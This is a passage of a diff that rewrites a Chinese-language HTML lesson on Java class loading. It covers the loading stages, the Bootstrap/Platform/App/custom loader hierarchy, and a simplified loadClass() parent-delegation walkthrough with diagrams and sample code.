@@ -3,467 +3,389 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>类加载机制</title>
+<title>类加载机制：双亲委派模型与三种破坏场景</title>
 </head>
 <body>
-
 <main class="lesson-body">
+<!--
+  title: "类加载机制：双亲委派模型与三种破坏场景"
+  difficulty: 中级
+  interviewFreq: 必问
+  desc: "类加载三阶段、四层加载器、loadClass 三步判定、双亲委派的两大收益，以及 SPI、Tomcat、热部署三种打破委派的生产场景。"
+-->
 
-<!-- ═══════════════ 第1站：开场 ═══════════════ -->
 <section class="station reveal" id="s1">
-<div class="station-head"><span class="station-no">第 1 站</span><h2>从一道面试题开始</h2></div>
+  <div class="station-head">
+    <span class="station-no">第 1 站</span>
+    <h2>开场：类加载的三个阶段</h2>
+  </div>
 
-<p>面试官推了推眼镜，不紧不慢地问道：</p>
+  <p>你在 IDE 里写 <code>public class App { public static void main(String[] args) {...} }</code>，编译得到 <code>App.class</code> 字节码文件。从"磁盘上的字节"到"JVM 里可调用的 Class 对象"，中间要经历三个阶段：<strong>加载 → 链接（验证 / 准备 / 解析）→ 初始化</strong>。类加载器（ClassLoader）负责的正是第一阶段"加载"：把 .class 的字节读进内存，完成格式检查，然后在方法区生成一个 <code>java.lang.Class</code> 对象，作为这个类在 JVM 里的唯一"身份证"。</p>
 
-<div class="think"><div class="think-q">"什么是双亲委派模型？为什么要用它？你知道哪些场景打破了它？"</div></div>
+  <p>注意"方法区生成 Class 对象"这句话——类元数据（字段、方法、常量池）是放在<strong>方法区 / Metaspace</strong>里的，所以类加载器和 GC 的关系比我们想的深：类加载器本身是堆里的对象，它加载的类元数据在方法区，两边一收一放就牵扯出"类卸载""Metaspace 泄漏"一整串问题（方法区的位置和布局见「JVM 运行时数据区」）。这就是为什么"类加载"和"GC"两卷的内容必须在脑子里串起来。</p>
 
-<p>前两问大部分候选人能答个七七八八——"就是先让父加载器加载，父加载器不行再自己来"。但第三问一出，淘汰率直线上升。</p>
+  <figure class="fig">
+    <svg viewBox="0 0 800 300" role="img" aria-label="类加载三阶段与 JVM 内存的对应关系">
+      <defs>
+        <marker id="l32-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#3E6B8F"/></marker>
+        <linearGradient id="l32-g1" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#B8D9B0"/><stop offset="100%" stop-color="#8BC28A"/></linearGradient>
+        <linearGradient id="l32-g2" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#C9DCE8"/><stop offset="100%" stop-color="#9BBDD4"/></linearGradient>
+      </defs>
+      <rect x="20" y="40" width="200" height="64" rx="8" fill="url(#l32-g2)" stroke="#3E6B8F" stroke-width="1.5"/>
+      <text x="120" y="68" text-anchor="middle" font-family="sans-serif" font-size="14" font-weight="700" fill="#1F4E6B">① 加载</text>
+      <text x="120" y="88" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#1F4E6B">读字节码 → 生成 Class 对象</text>
+      <line x1="220" y1="72" x2="268" y2="72" stroke="#3E6B8F" stroke-width="1.5" marker-end="url(#l32-arr)"/>
+      <rect x="270" y="40" width="240" height="64" rx="8" fill="url(#l32-g2)" stroke="#3E6B8F" stroke-width="1.5"/>
+      <text x="390" y="68" text-anchor="middle" font-family="sans-serif" font-size="14" font-weight="700" fill="#1F4E6B">② 链接：验证 / 准备 / 解析</text>
+      <text x="390" y="88" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#1F4E6B">校验格式 → 分配静态字段 → 符号引用转直接引用</text>
+      <line x1="510" y1="72" x2="558" y2="72" stroke="#3E6B8F" stroke-width="1.5" marker-end="url(#l32-arr)"/>
+      <rect x="560" y="40" width="210" height="64" rx="8" fill="url(#l32-g2)" stroke="#3E6B8F" stroke-width="1.5"/>
+      <text x="665" y="68" text-anchor="middle" font-family="sans-serif" font-size="14" font-weight="700" fill="#1F4E6B">③ 初始化</text>
+      <text x="665" y="88" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#1F4E6B">执行 &lt;clinit&gt;，静态字段赋真值</text>
+      <rect x="270" y="170" width="500" height="90" rx="10" fill="url(#l32-g1)" stroke="#2D7D2D" stroke-width="1.5"/>
+      <text x="520" y="198" text-anchor="middle" font-family="sans-serif" font-size="14" font-weight="700" fill="#1B5E1B">JVM 内存视角</text>
+      <text x="520" y="222" text-anchor="middle" font-family="sans-serif" font-size="12" fill="#1B5E1B">类元数据 / 常量池 → 方法区（Metaspace，JDK8+ 用本地内存）</text>
+      <text x="520" y="244" text-anchor="middle" font-family="sans-serif" font-size="12" fill="#1B5E1B">Class 对象、静态字段实例 → 堆（Class 对象本身也是堆对象）</text>
+      <line x1="390" y1="104" x2="450" y2="166" stroke="#2D7D2D" stroke-width="1.5" marker-end="url(#l32-arr)"/>
+      <line x1="665" y1="104" x2="620" y2="166" stroke="#2D7D2D" stroke-width="1.5" marker-end="url(#l32-arr)"/>
+      <text x="120" y="190" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#55554E">执行：主动引用触发</text>
+      <text x="120" y="208" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#55554E">new / 静态方法 / 静态字段读写</text>
+    </svg>
+    <figcaption><span class="fig-no">图 1</span> 类加载三阶段，以及类元数据在 JVM 内存里的落点</figcaption>
+  </figure>
 
-<p>双亲委派是 Java 类加载机制的基石，它保证了核心类库的安全性和一致性。然而，现实中至少有三种经典场景<strong>必须</strong>打破它：JDBC 的 SPI 机制、OSGi 的模块化隔离、Tomcat 的 Web 应用隔离。理解这些"破坏"场景，才是区分初级和高级开发者的分水岭。</p>
+  <p>第三阶段"初始化"的触发时机是高频考点，一句话概括：<strong>只有"主动引用"才触发初始化</strong>——new 一个对象、调用静态方法、读写静态字段（非 constant_value）、反射调用、初始化子类时先初始化父类、main 所在类。而通过常量池把编译期内联的常量 <code>Const.VALUE</code> 直接内联进代码、通过数组定义 <code>new Sub[10]</code> 只初始化父类，这些都不算。面试被追问细节再展开，本篇的重点在"加载"这一环。</p>
 
-<p>这篇文章，我们从类加载的完整过程讲起，逐层拆解三层委派链，然后深入源码看清 loadClass 的逻辑，最后用三个真实案例理解"何时遵守、何时打破"。</p>
-
-<p>发车之前，先问自己三个问题：</p>
-
-<ul>
-  <li>ClassLoader.loadClass() 和 ClassLoader.findClass() 有什么区别？</li>
-  <li>为什么 JDBC 驱动用 <code>Class.forName()</code> 就能注册？SPI 又是怎么绕过双亲委派的？</li>
-  <li>Tomcat 中两个 Web 应用各自带了一个不同版本的 Spring，为什么不会冲突？</li>
-</ul>
-
-<p>带着这些问题，我们从类加载的全过程开始。</p>
+  <div class="takeaway">
+    <span class="takeaway-label">一句话核心</span>
+    <p>类加载三阶段：加载（读字节码生成 Class 对象）→ 链接（验证 / 准备 / 解析）→ 初始化（执行 &lt;clinit&gt;）。类元数据在方法区，Class 对象本身在堆——类加载与 GC 因此深度耦合。</p>
+  </div>
 </section>
 
-<!-- ═══════════════ 第2站：类加载过程 ═══════════════ -->
 <section class="station reveal" id="s2">
-<div class="station-head"><span class="station-no">第 2 站</span><h2>类加载过程：从 .class 到可用类</h2></div>
+  <div class="station-head">
+    <span class="station-no">第 2 站</span>
+    <h2>类加载器家族：从 Bootstrap 到自定义</h2>
+  </div>
 
-<p>当我们写下 <code>new HashMap()</code> 时，JVM 需要把 <code>HashMap.class</code> 字节码加载进内存并完成初始化。整个过程分为三大阶段：<strong>Loading → Linking → Initialization</strong>，其中 Linking 又细分为三步。</p>
+  <p>JVM 里负责加载的"人"有四位，自底向上排成一条链：</p>
 
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>类加载全过程</b> · 五步走</span></div>
-<pre><code><span class="c">// ━━━ 阶段一：Loading（加载）━━━</span>
-<span class="c">// 通过全限定名获取字节流 → 生成 MethodArea 中的 Class 对象</span>
-<span class="c">// 来源：jar 包、war 包、网络、动态生成（CGLIB/ASM）</span>
+  <table class="nb-table">
+    <thead>
+      <tr><th>加载器</th><th>对应 Java 类</th><th>加载内容</th><th>父加载器</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>Bootstrap ClassLoader</strong></td><td>无（C++ 实现，Java 视角里不存在对象）</td><td>JDK8：<code>$JAVA_HOME/jre/lib/rt.jar</code> 等核心类；JDK9+：<code>java.base</code> 等核心模块（<code>java.*</code>）</td><td>无</td></tr>
+      <tr><td><strong>Platform / Extension ClassLoader</strong></td><td>JDK8：<code>sun.misc.Launcher$ExtClassLoader</code>；JDK9+：<code>jdk.internal.loader.ClassLoaders$PlatformClassLoader</code></td><td>JDK8：<code>jre/lib/ext</code> 扩展目录；JDK9+：<code>jdk</code> 等平台模块</td><td>Bootstrap</td></tr>
+      <tr><td><strong>Application ClassLoader</strong></td><td><code>jdk.internal.loader.ClassLoaders$AppClassLoader</code>（JDK8 是 <code>sun.misc.Launcher$AppClassLoader</code>，继承 <code>java.net.URLClassLoader</code>）</td><td>classpath 上所有目录和 jar（你写的业务代码）</td><td>Platform（JDK8 是 Extension）</td></tr>
+      <tr><td><strong>自定义 ClassLoader</strong></td><td>你继承 <code>ClassLoader</code> 写的子类</td><td>任意来源的字节码（网络、数据库、内存、加密文件）</td><td>构造时传入的 parent</td></tr>
+    </tbody>
+  </table>
 
-<span class="c">// ━━━ 阶段二：Linking（链接）━━━</span>
-<span class="c">//  ① Verify（验证）—— 字节码格式校验、语义校验、字节码指令校验</span>
-<span class="c">//     防止恶意 .class 文件危害 JVM（可用 -Xverify:none 跳过）</span>
-<span class="c">//  ② Prepare（准备）—— 为类的静态变量分配内存并设零值</span>
-<span class="c">//     static int a = 10; → 此阶段 a = 0（非 10！10 在初始化阶段赋值）</span>
-<span class="c">//     static final int b = 10; → 此阶段 b = 10（编译期常量直接赋值）</span>
-<span class="c">//  ③ Resolve（解析）—— 符号引用 → 直接引用</span>
-<span class="c">//     常量池中的 "java/lang/Object" 字符串 → 方法区的直接内存地址</span>
+  <p>最经典的认知坑在第一位：Bootstrap 是 C++ 写的，Java 代码里<strong>拿不到它的对象</strong>。所以打印核心类的 <code>getClassLoader()</code> 会得到 null——但 null 不代表"没人加载"，恰恰是 Bootstrap 干的：</p>
 
-<span class="c">// ━━━ 阶段三：Initialization（初始化）━━━</span>
-<span class="c">// 执行 &lt;clinit&gt;() 方法 —— 编译器收集的 static 赋值语句 + static 块</span>
-<span class="k">static</span> {
-    System.out.println(<span class="t">"初始化阶段才会执行"</span>);
-    a = <span class="n">10</span>; <span class="c">// Prepare 阶段 a 是 0，这里才真正赋值</span>
-}</code></pre>
-</div>
-
-<p>面试中最常考的细节是 <strong>Prepare 阶段</strong>：<code>static int a = 10</code> 在 Prepare 阶段值是 0（零值），到 Initialization 阶段才是 10。但 <code>static final int b = 10</code> 是编译期常量，Prepare 阶段就赋值为 10。</p>
-
-<div class="crack"><div class="crack-label">类加载 vs 类初始化</div>
-<p>"类加载"通常指 Loading 阶段（狭义），而"类初始化"指 Initialization 阶段。双亲委派模型作用于 <strong>Loading 阶段</strong>——决定由哪个 ClassLoader 去找字节流。后续阶段不再涉及委派。</p>
-</div>
-</section>
-
-<!-- ═══════════════ 第3站：三层类加载器 ═══════════════ -->
-<section class="station reveal" id="s3">
-<div class="station-head"><span class="station-no">第 3 站</span><h2>三层类加载器与委派链</h2></div>
-
-<p>JDK 默认提供了三层类加载器，它们形成一条<strong>父子链</strong>。注意：父子关系不是继承，而是<strong>组合</strong>（parent 字段引用）。</p>
-
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>三层类加载器</b></span></div>
-<pre><code><span class="c">// ① Bootstrap ClassLoader（启动类加载器）</span>
-<span class="c">//    用 C++ 实现，JVM 的一部分，Java 代码中拿到的是 null</span>
-<span class="c">//    加载路径：$JAVA_HOME/jre/lib/rt.jar（JDK 8）或 jrt:/ 模块（JDK 9+）</span>
-<span class="c">//    负责：java.lang.*, java.util.*, java.io.* 等核心类</span>
-
-<span class="c">// ② Extension ClassLoader（扩展类加载器）</span>
-<span class="c">//    sun.misc.Launcher$ExtClassLoader（JDK 8）</span>
-<span class="c">//    jdk.internal.loader.ClassLoaders$PlatformClassLoader（JDK 9+）</span>
-<span class="c">//    加载路径：$JAVA_HOME/jre/lib/ext/*.jar</span>
-<span class="c">//    负责：加密、国际化等扩展包</span>
-
-<span class="c">// ③ Application ClassLoader（应用类加载器）</span>
-<span class="c">//    sun.misc.Launcher$AppClassLoader（JDK 8）</span>
-<span class="c">//    jdk.internal.loader.ClassLoaders$AppClassLoader（JDK 9+）</span>
-<span class="c">//    加载路径：classpath（-cp 或 CLASSPATH 环境变量指定的路径）</span>
-<span class="c">//    负责：我们写的代码和第三方依赖</span></code></pre>
-</div>
-
-<p>委派链的工作方式：当 Application ClassLoader 收到加载请求时，它不会自己去找，而是先<strong>向上委派</strong>给 Extension，Extension 再委派给 Bootstrap。Bootstrap 找不到，才逐级向下回退。</p>
-
-<figure class="fig">
-<svg viewBox="0 0 780 420" role="img" aria-label="双亲委派链示意图">
-  <defs>
-    <marker id="arrow-up" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#3E6B8F"/></marker>
-    <marker id="arrow-down" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#B85450"/></marker>
-  </defs>
-
-  <text x="390" y="24" text-anchor="middle" font-family="monospace" font-size="14" fill="#1C1C1C" font-weight="700">双亲委派模型：加载请求的传递路径</text>
-
-  <!-- Bootstrap -->
-  <rect x="240" y="50" width="300" height="65" rx="8" fill="#F5D5D5" stroke="#B85450" stroke-width="2"/>
-  <text x="390" y="73" text-anchor="middle" font-size="13" fill="#B85450" font-weight="700">Bootstrap ClassLoader</text>
-  <text x="390" y="92" text-anchor="middle" font-family="monospace" font-size="10" fill="#B85450">rt.jar / java.base 模块</text>
-  <text x="390" y="106" text-anchor="middle" font-family="monospace" font-size="9" fill="#8C8676">parent = null（C++ 实现）</text>
-
-  <!-- Extension -->
-  <rect x="240" y="160" width="300" height="65" rx="8" fill="#FBE6C7" stroke="#C2410C" stroke-width="2"/>
-  <text x="390" y="183" text-anchor="middle" font-size="13" fill="#C2410C" font-weight="700">Extension ClassLoader</text>
-  <text x="390" y="202" text-anchor="middle" font-family="monospace" font-size="10" fill="#C2410C">jre/lib/ext/*.jar</text>
-  <text x="390" y="216" text-anchor="middle" font-family="monospace" font-size="9" fill="#8C8676">parent = Bootstrap</text>
-
-  <!-- Application -->
-  <rect x="240" y="270" width="300" height="65" rx="8" fill="#D4E8F7" stroke="#3E6B8F" stroke-width="2"/>
-  <text x="390" y="293" text-anchor="middle" font-size="13" fill="#3E6B8F" font-weight="700">Application ClassLoader</text>
-  <text x="390" y="312" text-anchor="middle" font-family="monospace" font-size="10" fill="#3E6B8F">classpath（用户代码 + 依赖 jar）</text>
-  <text x="390" y="326" text-anchor="middle" font-family="monospace" font-size="9" fill="#8C8676">parent = Extension</text>
-
-  <!-- 自定义 -->
-  <rect x="240" y="370" width="300" height="42" rx="8" fill="#E8F4E8" stroke="#7BA87B" stroke-width="1.5" stroke-dasharray="6 3"/>
-  <text x="390" y="392" text-anchor="middle" font-size="12" fill="#2D5F2D" font-weight="700">Custom ClassLoader（可选）</text>
-  <text x="390" y="406" text-anchor="middle" font-family="monospace" font-size="9" fill="#8C8676">parent = Application</text>
-
-  <!-- 向上委派箭头 -->
-  <line x1="195" y1="300" x2="195" y2="190" stroke="#3E6B8F" stroke-width="2" marker-end="url(#arrow-up)"/>
-  <text x="180" y="260" text-anchor="end" font-size="10" fill="#3E6B8F" font-weight="700">向上委派</text>
-  <text x="180" y="275" text-anchor="end" font-size="9" fill="#3E6B8F">"你能加载吗？"</text>
-
-  <line x1="195" y1="190" x2="195" y2="110" stroke="#3E6B8F" stroke-width="2" marker-end="url(#arrow-up)"/>
-
-  <!-- 向下回退箭头 -->
-  <line x1="585" y1="85" x2="585" y2="190" stroke="#B85450" stroke-width="2" marker-end="url(#arrow-down)"/>
-  <text x="600" y="130" font-size="10" fill="#B85450" font-weight="700">找不到？</text>
-  <text x="600" y="145" font-size="9" fill="#B85450">逐级回退</text>
-
-  <line x1="585" y1="190" x2="585" y2="300" stroke="#B85450" stroke-width="2" marker-end="url(#arrow-down)"/>
-</svg>
-<figcaption><span class="fig-no">图 1</span>双亲委派链：加载请求先向上委派到 Bootstrap，找不到再逐级向下回退尝试加载</figcaption>
-</figure>
-
-<div class="formula">
-<strong>委派规则</strong><br/>
-收到 <code>loadClass("java.lang.String")</code> 请求 →<br/>
-App → Ext → Bootstrap → Bootstrap 在 rt.jar 中找到 → 直接返回，App/Ext 不再加载。
-</div>
-</section>
-
-<!-- ═══════════════ 第4站：loadClass 源码 ═══════════════ -->
-<section class="station reveal" id="s4">
-<div class="station-head"><span class="station-no">第 4 站</span><h2>loadClass 源码：委派逻辑全拆解</h2></div>
-
-<p>双亲委派并不是 JVM 的强制约束，而是 JDK 在 <code>java.lang.ClassLoader</code> 的 <code>loadClass()</code> 方法中用 Java 代码实现的默认策略。我们直接看源码：</p>
-
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>ClassLoader.java</b> · loadClass() 方法（JDK 8 精简版）</span></div>
-<pre><code><span class="k">protected</span> <span class="t">Class</span>&lt;?&gt; loadClass(<span class="t">String</span> name, <span class="k">boolean</span> resolve)
-        <span class="k">throws</span> <span class="t">ClassNotFoundException</span> {
-
-    <span class="k">synchronized</span> (getClassLoadingLock(name)) {
-        <span class="c">// ━━━ 第一步：检查是否已经加载过 ━━━</span>
-        <span class="t">Class</span>&lt;?&gt; c = findLoadedClass(name);
-
-        <span class="k">if</span> (c == <span class="k">null</span>) {
-            <span class="k">long</span> t0 = System.nanoTime();
-            <span class="k">try</span> {
-                <span class="c">// ━━━ 第二步：委派给父加载器 ━━━</span>
-                <span class="k">if</span> (parent != <span class="k">null</span>) {
-                    c = parent.loadClass(name, <span class="k">false</span>);
-                } <span class="k">else</span> {
-                    <span class="c">// parent 为 null → 说明父加载器是 Bootstrap</span>
-                    c = findBootstrapClassOrNull(name);
-                }
-            } <span class="k">catch</span> (<span class="t">ClassNotFoundException</span> e) {
-                <span class="c">// 父加载器找不到，吞掉异常，继续往下走</span>
-            }
-
-            <span class="k">if</span> (c == <span class="k">null</span>) {
-                <span class="c">// ━━━ 第三步：父加载器都找不到，自己找 ━━━</span>
-                <span class="k">long</span> t1 = System.nanoTime();
-                c = findClass(name);  <span class="c">// ← 自定义类加载器重写的方法</span>
-
-                sun.misc.PerfCounter.getParentDelegationTime()
-                    .addTime(t1 - t0);
-                sun.misc.PerfCounter.getFindClassTime()
-                    .addTime(System.nanoTime() - t1);
-                sun.misc.PerfCounter.getFindClasses().increment();
-            }
-        }
-
-        <span class="k">if</span> (resolve) {
-            resolveClass(c);  <span class="c">// 执行 Linking 中的 Resolve 步骤</span>
-        }
-        <span class="k">return</span> c;
+  <div class="srcbox">
+    <div class="srcbox-head">ClassLoaderDemo.java —— null 不等于没有加载器</div>
+    <pre class="srcbox-file"><span class="k">public class</span> <span class="t">ClassLoaderDemo</span> {
+    <span class="k">public static void</span> <span class="n">main</span>(<span class="t">String</span>[] args) {
+        System.out.<span class="n">println</span>(<span class="t">"String  → "</span> + <span class="t">String</span>.<span class="n">class</span>.<span class="n">getClassLoader</span>());  <span class="c">// null   ← Bootstrap（C++）</span>
+        System.out.<span class="n">println</span>(<span class="t">"Integer → "</span> + <span class="t">Integer</span>.<span class="n">class</span>.<span class="n">getClassLoader</span>()); <span class="c">// null   ← 同上</span>
+        System.out.<span class="n">println</span>(<span class="t">"Thread  → "</span> + <span class="t">Thread</span>.<span class="n">class</span>.<span class="n">getClassLoader</span>()); <span class="c">// null   ← 同上</span>
+        System.out.<span class="n">println</span>(<span class="t">"Demo    → "</span> + <span class="t">ClassLoaderDemo</span>.<span class="n">class</span>.<span class="n">getClassLoader</span>());
+        <span class="c">// jdk.internal.loader.ClassLoaders$AppClassLoader@73df3e46  ← 你的 classpath 类</span>
     }
-}</code></pre>
-</div>
+}</pre>
+  </div>
 
-<p>逻辑非常清晰，总共就三步：</p>
+  <div class="think">
+    <p class="think-q">"AppClassLoader" 和 "System ClassLoader" 是一回事吗？</p>
+    <p>规范里有个 <code>ClassLoader.getSystemClassLoader()</code>，它返回的就是 AppClassLoader——但在 Tomcat 这类容器里，启动器会替换掉这个角色，返回容器自己插的 System/Common 加载器。"System ClassLoader" 是个规范概念、每次运行时动态确定的角色；"AppClassLoader" 是具体类名。日常说"应用类加载器"时两者通常指同一个对象，面试里区分开更严谨。</p>
+  </div>
 
-<div class="takeaway"><div class="takeaway-label">loadClass 三步逻辑</div>
-<table class="nb-table">
-<thead><tr><th>步骤</th><th>代码</th><th>作用</th></tr></thead>
-<tbody>
-<tr><td>1. 查缓存</td><td><code>findLoadedClass(name)</code></td><td>已加载过的类不重复加载</td></tr>
-<tr><td>2. 委派父加载器</td><td><code>parent.loadClass(name)</code></td><td>先让父加载器尝试——这就是"双亲委派"</td></tr>
-<tr><td>3. 自己加载</td><td><code>findClass(name)</code></td><td>父加载器都找不到，才轮到自己</td></tr>
-</tbody>
-</table>
-</div>
-
-<div class="crack"><div class="crack-label">重写 loadClass vs 重写 findClass</div>
-<p>如果你要写自定义 ClassLoader：</p>
-<ul>
-  <li><strong>推荐重写 findClass()</strong>：保持双亲委派不变，只定制"自己怎么找类"</li>
-  <li><strong>破坏委派时重写 loadClass()</strong>：完全接管加载逻辑，跳过 parent 委派步骤</li>
-</ul>
-<p>JDBC、Tomcat 都属于后者——重写 loadClass() 来打破默认委派链。</p>
-</div>
+  <div class="takeaway">
+    <span class="takeaway-label">一句话核心</span>
+    <p>四层加载器：Bootstrap（C++，核心类）→ Platform/Extension（平台/扩展）→ App（classpath）→ 自定义。核心类 getClassLoader() 为 null，因为 Bootstrap 在 Java 视角里不存在。</p>
+  </div>
 </section>
 
-<!-- ═══════════════ 第5站：为什么要双亲委派 ═══════════════ -->
+<section class="station reveal" id="s3">
+  <div class="station-head">
+    <span class="station-no">第 3 站</span>
+    <h2>双亲委派流程：loadClass() 的三步判定</h2>
+  </div>
+
+  <p>把"委派"拆开看，其实就是 <code>ClassLoader</code> 里一个 20 行不到的方法。简化后的源码（JDK 8，去掉了锁和检查）：</p>
+
+  <div class="srcbox">
+    <div class="srcbox-head">OpenJDK ClassLoader.loadClass() 简化源码 + 自定义 findClass</div>
+    <pre class="srcbox-file"><span class="c">// java.lang.ClassLoader（JDK 8 简化）</span>
+<span class="k">protected</span> <span class="t">Class</span>&lt;?&gt; <span class="n">loadClass</span>(<span class="t">String</span> name, <span class="t">boolean</span> resolve) <span class="k">throws</span> <span class="t">ClassNotFoundException</span> {
+    <span class="t">Class</span>&lt;?&gt; c = <span class="n">findLoadedClass</span>(name);          <span class="c">// ① 查过没？加载过直接返回 → "类只加载一次"的根源</span>
+    <span class="k">if</span> (c == <span class="k">null</span>) {
+        <span class="t">ClassLoader</span> parent = <span class="n">getParent</span>();
+        <span class="k">if</span> (parent != <span class="k">null</span>) {
+            <span class="k">try</span> { c = parent.<span class="n">loadClass</span>(name, resolve); }  <span class="c">// ② 先问父亲，递归向上直到 Bootstrap</span>
+            <span class="k">catch</span> (<span class="t">ClassNotFoundException</span> e) {}
+        }
+        <span class="k">if</span> (c == <span class="k">null</span>) {
+            c = <span class="n">findClass</span>(name);                  <span class="c">// ③ 父亲们都找不到，才轮到自己找</span>
+        }
+    }
+    <span class="k">return</span> c;
+}
+<span class="c">// findClass 的默认实现直接抛 ClassNotFoundException ——</span>
+<span class="c">// 所以自定义加载器必须重写 findClass（或 override 整个 loadClass）</span>
+
+<span class="k">public class</span> <span class="t">MyLoader</span> <span class="k">extends</span> <span class="t">ClassLoader</span> {
+    <span class="k">private final</span> <span class="t">String</span> dir;
+    <span class="t">MyLoader</span>(<span class="t">String</span> dir) { <span class="k">this</span>.dir = dir; }
+    <span class="k">@Override</span>
+    <span class="k">protected</span> <span class="t">Class</span> <span class="n">findClass</span>(<span class="t">String</span> name) <span class="k">throws</span> <span class="t">ClassNotFoundException</span> {
+        <span class="t">byte</span>[] bytes = <span class="n">readClassFileFromMyDir</span>(name);  <span class="c">// 从指定目录读字节码</span>
+        <span class="k">return</span> <span class="n">defineClass</span>(name, bytes, <span class="n">0</span>, bytes.<span class="n">length</span>);  <span class="c">// 字节码 → Class 对象</span>
+    }
+}</pre>
+  </div>
+
+  <p>三个关键动作各管一件事：<strong>① findLoadedClass</strong> 保证同一个加载器不会对同一个类加载两次（类唯一性的第一道闸）；<strong>② parent.loadClass()</strong> 把请求向上抛，直到 Bootstrap 用 C++ 直接加载或抛异常；<strong>③ findClass()</strong> 是"自己找"的钩子，默认不干活，重写它才让自定义加载器有存在意义——而把字节码变成 Class 对象的那一步叫 <strong>defineClass</strong>，它是受保护的，只有 ClassLoader 自己能定义类。</p>
+
+  <figure class="fig">
+    <svg viewBox="0 0 800 320" role="img" aria-label="双亲委派链：自上而下委派，找不到时逐级回落">
+      <defs>
+        <marker id="l32b-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#3E6B8F"/></marker>
+        <marker id="l32b-arr-g" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#2D7D2D"/></marker>
+        <linearGradient id="l32b-g1" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#B8D9B0"/><stop offset="100%" stop-color="#8BC28A"/></linearGradient>
+        <linearGradient id="l32b-g2" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#C9DCE8"/><stop offset="100%" stop-color="#9BBDD4"/></linearGradient>
+        <linearGradient id="l32b-g3" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#E8D9B8"/><stop offset="100%" stop-color="#D4B97E"/></linearGradient>
+      </defs>
+      <rect x="250" y="20" width="240" height="56" rx="8" fill="url(#l32b-g1)" stroke="#2D7D2D" stroke-width="1.5"/>
+      <text x="370" y="45" text-anchor="middle" font-family="sans-serif" font-size="14" font-weight="700" fill="#1B5E1B">Bootstrap（C++）</text>
+      <text x="370" y="64" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#1B5E1B">java.base 核心模块</text>
+      <line x1="370" y1="76" x2="370" y2="112" stroke="#3E6B8F" stroke-width="2" marker-end="url(#l32b-arr)"/>
+      <line x1="398" y1="112" x2="398" y2="80" stroke="#2D7D2D" stroke-width="1.5" marker-end="url(#l32b-arr-g)"/>
+      <text x="410" y="100" font-family="sans-serif" font-size="11" fill="#3E6B8F">委派 ↑</text>
+      <text x="410" y="94" font-family="sans-serif" font-size="11" fill="#2D7D2D">↑ 找不到才回自己</text>
+      <rect x="250" y="116" width="240" height="56" rx="8" fill="url(#l32b-g2)" stroke="#3E6B8F" stroke-width="1.5"/>
+      <text x="370" y="141" text-anchor="middle" font-family="sans-serif" font-size="14" font-weight="700" fill="#1F4E6B">Platform / Extension</text>
+      <text x="370" y="160" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#1F4E6B">平台模块 / 扩展目录</text>
+      <line x1="370" y1="172" x2="370" y2="208" stroke="#3E6B8F" stroke-width="2" marker-end="url(#l32b-arr)"/>
+      <line x1="398" y1="208" x2="398" y2="176" stroke="#2D7D2D" stroke-width="1.5" marker-end="url(#l32b-arr-g)"/>
+      <text x="410" y="196" font-family="sans-serif" font-size="11" fill="#3E6B8F">委派 ↑</text>
+      <rect x="250" y="212" width="240" height="56" rx="8" fill="url(#l32b-g2)" stroke="#3E6B8F" stroke-width="1.5"/>
+      <text x="370" y="237" text-anchor="middle" font-family="sans-serif" font-size="14" font-weight="700" fill="#1F4E6B">AppClassLoader</text>
+      <text x="370" y="256" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#1F4E6B">classpath</text>
+      <line x1="370" y1="268" x2="370" y2="300" stroke="#3E6B8F" stroke-width="2" marker-end="url(#l32b-arr)"/>
+      <rect x="250" y="304" width="240" height="14" rx="6" fill="url(#l32b-g3)" stroke="#8A6D1B" stroke-width="1.5"/>
+      <text x="370" y="314" text-anchor="middle" font-family="sans-serif" font-size="11" font-weight="700" fill="#5C4A0E">自定义 ClassLoader（可多层）</text>
+      <rect x="540" y="116" width="230" height="150" rx="10" fill="#F5F5F0" stroke="#8A8A80" stroke-width="1.2"/>
+      <text x="655" y="142" text-anchor="middle" font-family="sans-serif" font-size="12" font-weight="700" fill="#3C3C30">loadClass(name) 执行顺序</text>
+      <text x="556" y="170" font-family="sans-serif" font-size="12" fill="#3C3C30">① findLoadedClass：查过没？</text>
+      <text x="556" y="196" font-family="sans-serif" font-size="12" fill="#3C3C30">② parent.loadClass：问父亲</text>
+      <text x="556" y="222" font-family="sans-serif" font-size="12" fill="#3C3C30">③ findClass：父亲找不到，自己找</text>
+      <text x="556" y="248" font-family="sans-serif" font-size="12" fill="#8C2F2F">（找不到 → ClassNotFoundException）</text>
+    </svg>
+    <figcaption><span class="fig-no">图 2</span> 双亲委派链：请求向上委派，逐级找不到才自己 findClass</figcaption>
+  </figure>
+
+  <div class="crack">
+    <span class="crack-label">易混点 1："双亲"其实是多级</span>
+    <p>叫"双亲委派"不是因为只有一层父亲，而是每个加载器<strong>只认识它直接的父亲</strong>——App 只把请求交给 Platform，Platform 交给 Bootstrap，递归上去而已。自定义加载器下面还可以再挂自定义，链有多长都行。</p>
+  </div>
+
+  <div class="crack">
+    <span class="crack-label">易混点 2：委派关系 ≠ 继承关系</span>
